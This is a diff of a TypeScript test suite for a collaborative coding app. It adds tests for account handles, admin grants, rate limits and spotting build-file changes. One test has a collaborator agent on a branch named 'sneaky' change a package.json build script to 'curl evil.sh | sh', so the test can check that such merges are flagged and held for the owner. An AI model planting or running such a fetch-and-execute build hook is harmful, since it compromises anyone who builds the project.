@@ -4,6 +4,7 @@ import { local as boot, type Call } from "../src/local.ts";
 import { run } from "../agents.ts";
 import { GameRoom } from "../src/game-do.ts";
 import { noodles } from "../src/noodles.ts";
+import { isBuildFile } from "../src/buildfiles.ts";
 
 // Every app instance makes a temp dir of git repos; remove them all at the end.
 const opened: { close(): void }[] = [];
@@ -213,73 +214,115 @@ describe("levels", () => {
   });
 });
 
+/** The app with accounts on, and helpers to sign up, pick a handle and ask who you are. */
+async function accounts(extra: Record<string, string> = {}) {
+  const origin = "http://codesplitters.local";
+  const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin, ...extra });
+  const signup = async (email: string, name: string, headers: Record<string, string> = {}) => {
+    const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin, ...headers },
+      body: JSON.stringify({ email, password: "correct horse battery", name }) });
+    return (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
+  };
+  const session = async (cookie = "") => (await (await call(null, "/api/session", { headers: { cookie } })).json()) as any;
+  const claim = (cookie: string, name: string, headers: Record<string, string> = {}) =>
+    call(null, "/api/handle", { method: "POST", headers: { cookie, ...headers }, body: JSON.stringify({ name }) });
+  /** Sign up and claim `handle`: the cookie of someone ready to dig. */
+  const person = async (email: string, handle: string) => { const c = await signup(email, handle); expect((await claim(c, handle)).status).toBe(201); return c; };
+  return { call, signup, session, claim, person };
+}
+
 describe("accounts", () => {
-  test("with a secret set, Better Auth signs people up and the app sees a handle", async () => {
-    const origin = "http://codesplitters.local";
-    const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin });
-    const session = async (cookie = "") => (await (await call(null, "/api/session", { headers: { cookie } })).json()) as any;
+  test("with a secret set, Better Auth signs people up, then they pick the handle the app sees", async () => {
+    const { call, signup, session, claim } = await accounts();
     expect(await session()).toEqual({ mode: "accounts", user: null, providers: ["email"] });
     expect((await post(call, null, "/api/login", { name: "ana" })).status).toBe(404);   // no aliases now
 
-    const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin },
-      body: JSON.stringify({ email: "ana@example.com", password: "correct horse battery", name: "Ana Lyst" }) });
-    expect(res.status).toBe(200);
-    const cookie = (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
-    expect((await session(cookie)).user).toBe("ana-lyst");
-    expect((await session(cookie)).user).toBe("ana-lyst");                              // same handle every time
+    const cookie = await signup("ana@example.com", "Ana Lyst");
+    // Signed in, no handle yet: the page is offered a free one to start from.
+    expect(await session(cookie)).toMatchObject({ user: null, pick: { suggest: "ana-lyst", email: "ana@example.com" } });
+    expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(401);
+    expect((await claim(cookie, "analyst")).status).toBe(201);
+    expect((await session(cookie)).user).toBe("analyst");
+    expect((await session(cookie)).pick).toBeUndefined();
+    expect((await claim(cookie, "another-one")).status).toBe(409);                        // once, for good
     const me = await (await call(null, "/api/me", { headers: { cookie } })).json() as any;
-    expect(me.name).toBe("ana-lyst");
+    expect(me.name).toBe("analyst");
     expect((await call(null, "/api/repos", { method: "POST", headers: { cookie }, body: JSON.stringify({ name: "dig" }) })).status).toBe(201);
   });
 });
 
 describe("handles", () => {
-  test("signup never makes a handle of five or fewer; an admin gives those out by email", async () => {
-    const origin = "http://codesplitters.local";
-    const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin, ADMINS: "boss-person" });
-    const signup = async (email: string, name: string) => {
-      const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin },
-        body: JSON.stringify({ email, password: "correct horse battery", name }) });
-      return (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
-    };
-    const handle = async (cookie: string) => ((await (await call(null, "/api/session", { headers: { cookie } })).json()) as any).user;
+  test("six or more characters, free, and not an agent's; an admin gives out short ones by email", async () => {
+    const { call, signup, session, claim, person } = await accounts({ ADMINS: "boss-person" });
+    const free = async (name: string) => (await (await call(null, `/api/handle?name=${name}`)).json()) as any;
+    const boss = await person("boss@example.com", "boss-person");
+    expect(await session(boss)).toMatchObject({ user: "boss-person", admin: true });
+
+    const ana = await signup("ana@example.com", "Ana");
+    expect((await session(ana)).pick.suggest).toBe("ana-digger");                        // too short to offer
+    expect((await claim(ana, "ana")).status).toBe(400);
+    expect(await free("ana")).toEqual({ name: "ana", ok: false, why: "at least 6 characters" });
+    expect(await free("boss-person")).toMatchObject({ ok: false, why: "taken" });
+    expect((await claim(ana, "boss-person")).status).toBe(409);
+    expect((await claim(ana, "Ana_Bee")).status).toBe(400);
+    expect(await free("agent-codex")).toMatchObject({ ok: false, why: "agent- handles are for coding agents" });
+    expect(await free("anabee")).toMatchObject({ ok: true });
+    expect((await claim(ana, "anabee")).status).toBe(201);
+
     const grant = (cookie: string, body: unknown) => call(null, "/api/admin/handles", { method: "POST", headers: { cookie }, body: JSON.stringify(body) });
-
-    const boss = await signup("boss@example.com", "Boss Person");
-    expect(await handle(boss)).toBe("boss-person");
-    expect(await handle(await signup("ana@example.com", "Ana"))).toBe("ana-digger");     // too short to make
-
-    const zed = await signup("zed@example.com", "Zed Zedson");
-    expect((await grant(zed, { handle: "zed", email: "zed@example.com" })).status).toBe(403);   // admins only
+    expect((await grant(ana, { handle: "zed", email: "zed@example.com" })).status).toBe(403);   // admins only
     expect((await grant(boss, { handle: "boss-person", email: "x@example.com" })).status).toBe(409);
-    expect((await grant(boss, { handle: "zed", email: "Zed2@Example.com" })).status).toBe(201);
+    expect((await grant(boss, { handle: "agent-codex", email: "y@example.com" })).status).toBe(400);
     // A grant goes to a verified email only, since anyone can type one at signup.
     const typed = await signup("zed2@example.com", "Zed");
     const verified = await signup("zed3@example.com", "Zed");
     expect((await grant(boss, { handle: "zed", email: "zed3@example.com" })).status).toBe(201);
+    expect(await free("zed")).toMatchObject({ ok: false });
     await call.env.DB.prepare(`UPDATE "user" SET emailVerified = 1 WHERE email = 'zed3@example.com'`).run();
-    expect(await handle(typed)).toBe("zed-digger");
-    expect(await handle(verified)).toBe("zed");
-  });
-
-  test("agent- handles are only for coding agents", async () => {
-    const origin = "http://codesplitters.local";
-    const call = await local({ BETTER_AUTH_SECRET: "test-secret-".padEnd(40, "x"), BETTER_AUTH_URL: origin, ADMINS: "boss-person" });
-    const signup = async (email: string, name: string) => {
-      const res = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin },
-        body: JSON.stringify({ email, password: "correct horse battery", name }) });
-      return (res.headers.getSetCookie?.() ?? [res.headers.get("set-cookie")!]).map((c) => c.split(";")[0]).join("; ");
-    };
-    const handle = async (cookie: string) => ((await (await call(null, "/api/session", { headers: { cookie } })).json()) as any).user;
-    expect(await handle(await signup("codex@example.com", "Agent Codex"))).toBe("agentcodex");
-    expect(await handle(await signup("x@example.com", "Agent"))).toBe("agentdigger");
-    expect(await handle(await signup("agent-claude@example.com", ""))).toBe("agentclaude");
-    const boss = await signup("boss@example.com", "Boss Person");
-    const grant = await call(null, "/api/admin/handles", { method: "POST", headers: { cookie: boss }, body: JSON.stringify({ handle: "agent-codex", email: "y@example.com" }) });
-    expect(grant.status).toBe(400);
+    expect((await session(typed)).user).toBeNull();
+    expect((await session(verified)).user).toBe("zed");
 
     const alias = await local();
     expect((await post(alias, null, "/api/login", { name: "agent-codex" })).status).toBe(400);
+  });
+});
+
+describe("rate limits", () => {
+  const ip = { "cf-connecting-ip": "203.0.113.7" };
+
+  test("count requests from the internet, per IP before sign-in and per handle after", async () => {
+    const { call, signup, claim, person } = await accounts({ ADMINS: "boss-person" });
+    const boss = await person("boss@example.com", "boss-person");
+    // Five accounts an hour from one IP; the desktop and the tests (no cf-connecting-ip) are never counted.
+    for (let i = 0; i < 5; i++) await signup(`u${i}@example.com`, `User ${i}`, ip);
+    const sixth = await call(null, "/api/auth/sign-up/email", { method: "POST", headers: { "content-type": "application/json", origin: "http://codesplitters.local", ...ip },
+      body: JSON.stringify({ email: "u6@example.com", password: "correct horse battery", name: "u6" }) });
+    expect(sixth.status).toBe(429);
+    expect(Number(sixth.headers.get("retry-after"))).toBeGreaterThan(0);
+    expect((await call(null, "/api/search?q=x", { headers: ip })).status).toBe(200);
+
+    // An admin turns the repo limit down to one a day.
+    const put = (cookie: string, rules: unknown) => call(null, "/api/admin/limits", { method: "PUT", headers: { cookie }, body: JSON.stringify({ rules }) });
+    const ana = await person("ana@example.com", "ana-lyst");
+    expect((await put(ana, [])).status).toBe(403);
+    expect((await put(boss, [{ name: "repo", max: 0, window_s: 60, enabled: true }])).status).toBe(400);
+    expect((await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: true }])).status).toBe(200);
+    const repo = (cookie: string, name: string) => call(null, "/api/repos", { method: "POST", headers: { cookie, ...ip }, body: JSON.stringify({ name }) });
+    expect((await repo(ana, "one")).status).toBe(201);
+    const over = await repo(ana, "two");
+    expect(over.status).toBe(429);
+    expect(((await over.json()) as any).error).toMatch(/new repos is limited to 1 per day/);
+    expect((await repo(boss, "one")).status).toBe(201);                                  // admins aren't limited
+    expect((await repo(boss, "two")).status).toBe(201);
+
+    const { rules } = (await (await call(null, "/api/admin/limits", { headers: { cookie: boss } })).json()) as any;
+    expect(rules.find((r: any) => r.name === "repo")).toMatchObject({ max: 1, now: { callers: 1, hits: 2, blocked: 1 } });
+    expect(rules.find((r: any) => r.name === "signup")).toMatchObject({ max: 5, now: { callers: 1, hits: 6, blocked: 1 } });
+
+    // Switched off, it counts nothing.
+    await put(boss, [{ name: "repo", max: 1, window_s: 86400, enabled: false }]);
+    expect((await repo(ana, "three")).status).toBe(201);
+    expect((await claim(ana, "nope-nope", ip)).status).toBe(409);
   });
 });
 
@@ -649,6 +692,38 @@ describe("shares", () => {
     // Public again.
     await mark("ana", ["L1", "L2"], false);
     expect((await read("bo")).lines.map((l: any) => l.text)).toEqual(["one", "key = hunter3", "three"]);
+  });
+
+  test("a branch that changes build or deploy files says so, and a merge that would ship waits for the owner to read it", async () => {
+    const call = await local();
+    await post(call, "ana", "/api/login", { name: "ana" });
+    await post(call, "ana", "/api/repos", { name: "r" });
+    await post(call, "ana", "/api/repos/ana/r/collaborators", { name: "agent-a" });
+    await post(call, "ana", "/api/repos/ana/r/files", { path: "package.json", content: '{\n  "scripts": { "build": "vite build" }\n}' });
+    await post(call, "agent-a", "/api/repos/ana/r/branches", { name: "sneaky" });
+    await post(call, "agent-a", "/api/repos/ana/r/do/ops?path=package.json&branch=sneaky", { ops: [{ kind: "set", line: "L2", base: 2, text: '  "scripts": { "build": "curl evil.sh | sh" }' }] });
+    await post(call, "agent-a", "/api/repos/ana/r/files", { path: "src/a.js", content: "fine", branch: "sneaky" });
+
+    const review = await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any;
+    expect(review.deploys).toBe(false);
+    expect(review.files.map((f: any) => [f.path, f.build])).toEqual([["package.json", true], ["src/a.js", false]]);
+    expect(review.files[0].lines).toEqual(['-   "scripts": { "build": "vite build" }', '+   "scripts": { "build": "curl evil.sh | sh" }']);
+    expect(review.files[1].lines).toBeUndefined();
+
+    // Once the owner's commit to main ships, the merge needs build_ok.
+    expect((await call("ana", "/api/repos/ana/r/deploy", { method: "PUT", body: JSON.stringify({ on_commit: true }) })).status).toBe(200);
+    expect((await (await call("ana", "/api/repos/ana/r/branches/sneaky")).json() as any).deploys).toBe(true);
+    const no = await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", {});
+    expect(no.status).toBe(409);
+    expect((await no.json() as any).build).toEqual(["package.json"]);
+    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("vite build");
+    expect((await post(call, "ana", "/api/repos/ana/r/branches/sneaky/merge", { build_ok: true })).status).toBe(200);
+    expect(text(await (await call("ana", "/api/repos/ana/r/do/file?path=package.json")).json() as Doc)).toContain("curl evil.sh");
+  });
+
+  test("build and deploy files are told apart from the rest", () => {
+    for (const p of ["package.json", "web/package.json", "bun.lock", "pnpm-lock.yaml", "rustybuns.config.ts", "wrangler.jsonc", ".rustybuns/state.json", "alchemy.run.ts", "Dockerfile", "api/Dockerfile.prod", "build.ts", "vite.config.mjs", ".github/workflows/ci.yml", ".gitlab-ci.yml"]) expect([p, isBuildFile(p)]).toEqual([p, true]);
+    for (const p of ["src/build.tsx", "README.md", "src/package.ts", "docs/wrangler.md", "test/vite.config.test.ts"]) expect([p, isBuildFile(p)]).toEqual([p, false]);
   });
 
   test("the owner flips a repo public or private", async () => {
